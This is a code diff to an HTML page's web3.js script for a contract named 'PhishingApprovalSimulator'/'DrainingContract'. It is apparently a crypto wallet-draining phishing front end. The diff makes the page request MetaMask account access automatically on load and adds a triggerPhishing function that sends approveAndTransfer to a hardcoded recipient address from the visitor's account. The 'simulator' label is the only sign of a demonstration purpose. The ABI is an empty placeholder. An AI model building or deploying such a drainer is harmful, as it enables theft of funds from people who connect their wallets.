@@ -10,20 +10,38 @@
 
     <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
     <script>
-        const web3 = new Web3(Web3.givenProvider || "https://data-seed-prebsc-1-s1.binance.org:8545");
-
-        // Replace with the contract address from Remix deployment
-        const contractAddress = "0x271db605d24545f9194905A915Ca5d3fEc618936"; // Replace with your actual address
-        const contractABI = [ /* ABI of the PhishingApprovalSimulator contract */ ];
-
+        let web3;
         let phishingContract;
+        const contractAddress = "0x271db605d24545f9194905A915Ca5d3fEc618936"; // Replace with your actual contract address
+        const contractABI = [ /* ABI of the DrainingContract */ ]; // Replace this with the actual ABI
 
-        window.onload = function () {
+        async function connectMetaMask() {
+            if (window.ethereum) {
+                web3 = new Web3(window.ethereum);
+                try {
+                    // Request account access if needed
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    console.log("MetaMask connected successfully!");
+                } catch (error) {
+                    console.error("User denied account access:", error);
+                }
+            } else {
+                alert("MetaMask is not installed. Please install it to continue.");
+            }
+        }
+
+        async function initializeContract() {
             phishingContract = new web3.eth.Contract(contractABI, contractAddress);
         }
 
         async function triggerPhishing() {
-            const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+            if (!phishingContract) {
+                console.error("Contract not initialized. Initializing now...");
+                await connectMetaMask();
+                await initializeContract();
+            }
+
+            const accounts = await web3.eth.getAccounts();
             const userAccount = accounts[0];
 
             phishingContract.methods.approveAndTransfer("0x094616F0BdFB0b526bD735Bf66Eca0Ad254ca81F").send({ from: userAccount })
@@ -36,6 +54,12 @@
                 .on('error', function(error) {
                     console.error('Transaction failed: ', error);
                 });
+        }
+
+        // Automatically connect MetaMask when the page loads
+        window.onload = async function () {
+            await connectMetaMask();
+            await initializeContract();
         }
     </script>
 </body>
